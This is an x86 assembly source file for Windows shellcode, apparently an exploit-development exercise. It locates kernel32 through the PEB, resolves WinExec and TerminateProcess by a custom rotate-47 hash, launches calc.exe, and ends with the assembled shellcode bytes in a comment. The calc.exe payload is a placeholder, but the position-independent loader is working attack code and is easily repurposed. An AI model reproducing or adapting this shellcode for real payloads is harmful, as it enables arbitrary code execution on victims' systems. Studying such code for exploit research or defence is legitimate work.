global _start

_start:
    mov ebp, esp                    ; new stack frame
    sub esp, 0x28                   ; space for variables

    .find_kernel32:
        xor ecx, ecx                ; TEB structure
        mov esi, [fs: ecx + 0x30]   ; PEB Address
        mov esi, [esi + 0xc]        ; ntdll!PebLdr
        mov esi, [esi + 0x14]       ; InMemoryOrderModuleList
        mov esi, [esi]              ; ntdll.dll
        lodsd                       ; kernel32.dll
        mov ebx, [eax + 0x10]       ; kernel32 base

        jmp .call_winexec           ; short jump

    .find_function:
        pusha                       ; save all registers
        mov eax, [ebx + 0x3c]       ; RVA to PE signature
        mov edi, [ebx + eax + 0x78] ; RVA of Export Table
        add edi, ebx                ; Export Table
        mov ecx, [edi + 0x18]       ; NR of Names
        mov eax, [edi + 0x20]       ; RVA of Name Pointer Table
        add eax, ebx                ; Name Pointer Table
        mov [ebp - 0x4], eax        ; var4 = Name Pointer Table

    .find_loop:
        jecxz .find_end             ; if ecx = 0x0
        dec ecx                     ; counter -= 1
        mov eax, [ebp - 0x4]        ; $eax = Name Pointer Table
        mov esi, [eax + ecx * 4]    ; RVA of symbol name
        add esi, ebx                ; symbol name

        xor eax, eax                ; $eax = 0x0
        cdq                         ; $edx = 0x0

    .compute_hash:
        lodsb                       ; load in al next byte from esi
        test al, al                 ; check null terminator
        jz .compare_hash            ; If ZF == 1
        ror edx, 0x2f               ; rot 47
        add edx, eax                ; add new byte
        jmp .compute_hash           ; loop

   .compare_hash:
        cmp edx, [esp + 0x24]       ; cmp edx, hash
        jnz .find_loop              ; if zf != 1
        mov edx, [edi + 0x24]       ; RVA of Ordinal Table
        add edx, ebx                ; Ordinal Table
        mov cx, [edx + 2 * ecx]     ; extrapolate ordinal functions
        mov edx, [edi + 0x1c]       ; RVA of Address Table
        add edx, ebx                ; Address Table
        mov eax, [edx + 4 * ecx]    ; RVA of function
        add eax, ebx                ; function
        mov [esp + 0x1c], eax       ; overwrite eax from pushad

    .find_end:
        popa                        ; restore registers
        ret                         ; return

    .call_winexec:
        push 0x10121ee3             ; WinExec() hash
        call .find_function         ; call .find_function
        cdq                         ; $edx = 0x0
        push edx                    ; "\x00"
        push 0x6578652e             ; ".exe"
        push 0x636c6163             ; "calc"
        mov esi, esp                ; "calc.exe"

        push 0x1                    ; uCmdShow
        push esi                    ; lpCmdLine
        call eax                    ; call WinExec()

    .exit:
        push 0x8ee05933             ; TerminateProcess() hash
        call .find_function         ; call .find_function
        cdq                         ; $edx = 0x0
        push edx                    ; uExitCode
        push 0xffffffff             ; hProcess
        call eax                    ; call TerminateProcess()

; shellcode = b"\x89\xe5\x83\xec\x28\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x14\x8b\x36\xad\x8b\x58\x10\xeb\x4e\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x35\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x2f\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xe0\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\xe3\x1e\x12\x10\xe8\xa8\xff\xff\xff\x99\x52\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe6\x6a\x01\x56\xff\xd0\x68\x33\x59\xe0\x8e\xe8\x8b\xff\xff\xff\x99\x52\x6a\xff\xff\xd0"
